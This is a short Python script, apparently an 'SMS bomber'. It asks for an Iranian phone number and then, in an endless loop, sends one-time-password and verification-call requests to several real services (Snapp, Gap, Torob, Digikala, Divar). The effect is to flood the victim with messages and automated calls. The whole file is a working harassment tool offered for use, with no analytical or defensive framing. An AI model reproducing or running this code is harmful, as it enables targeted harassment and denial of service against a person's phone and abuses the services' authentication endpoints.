import requests
def bomber(x, y, z):
    send = requests.post (url = x, json = y)
    print('send message code',send.status_code,'for number:',z)
#--------------------------------------------- import
phone = input ('Enter NUM Example 9012345678: ')
number = '+98' + phone
#--------------------------------------------- variable
json1 = {'cellphone': number}
json2 = {'mobile': number} 
json3 = {'mobile': number}
json4 = {'phone_number': number}
json5 = {'backUrl': "/", 'username': number, 'otp_call': 'false', 'force_send_otp': 'true'}
json6 = {'backUrl': "/", 'username': number, 'otp_call': 'true', 'force_send_otp': 'false'}
json7 = {"phone": number}
#--------------------------------------------- phone number
url1 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
url2 = "https://core.gap.im/v1/user/resendCode.json?mobile=%2B"+ '98' + phone +"&type=IVR"
url3 = "https://core.gap.im/v1/user/add.json?mobile=%2B"+ '98' + phone
url4 = "https://api.torob.com/v4/user/phone/send-pin/?phone_number="+ number
url5 = "https://api.digikala.com/v1/user/authenticate/"
url6 = "https://api.digikala.com/v1/user/authenticate/"
url7 = "https://api.divar.ir/v5/auth/authenticate"
#--------------------------------------------- API
info = open ('info.txt', 'w')
info.write(number)
while True:
    bomber(url1, json1, number)
    bomber(url2, json2, number)
    bomber(url3, json3, number)
    bomber(url4, json4, number)
    bomber(url5, json5, number)
    bomber(url6, json6, number)
    bomber(url7, json7, number)
#--------------------------------------------- bomber
